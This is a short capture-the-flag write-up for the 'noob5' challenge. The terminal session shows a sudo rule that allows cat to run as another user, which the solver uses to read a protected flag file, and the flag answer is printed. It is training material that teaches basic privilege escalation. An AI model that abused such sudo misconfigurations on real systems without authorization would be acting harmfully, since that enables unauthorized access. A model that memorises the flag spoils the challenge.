# noob5

One last time the flag has been stolen. This time they even had courage to invite us to take it back. This must mean they are confident in their countermeasures. We don't really have a choice though. Best of luck
You can connect to their server with the following command `ssh noob5@uithack-2.td.org.uit.no -p 6004`
The password is the flag from the previous noob challenge.
Use command `exit` to disconnect from the server when you are done.


# Writeup

```
noob5@6f000751587e:~$ ls
flag.txt
noob5@6f000751587e:~$ cat flag.txt 
cat: flag.txt: Permission denied
noob5@6f000751587e:~$ ls -lah
total 20K
drwxr-xr-x 1 root root    4.0K Feb 23 17:08 .
drwxr-xr-x 1 root root    4.0K Feb 23 17:07 ..
-rw-r----- 1 root captain   30 Jan 22 16:23 flag.txt
noob5@6f000751587e:~$ sudo -l
Matching Defaults entries for noob5 on 6f000751587e:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User noob5 may run the following commands on 6f000751587e:
    (mr_captain) NOPASSWD: /usr/bin/cat
noob5@6f000751587e:~$ sudo -u mr_captain /usr/bin/cat flag.txt 
UiTHack25{I_4M_D4_C4P74IN_N0W}
```

# Flag

```
UiTHack25{I_4M_D4_C4P74IN_N0W}
```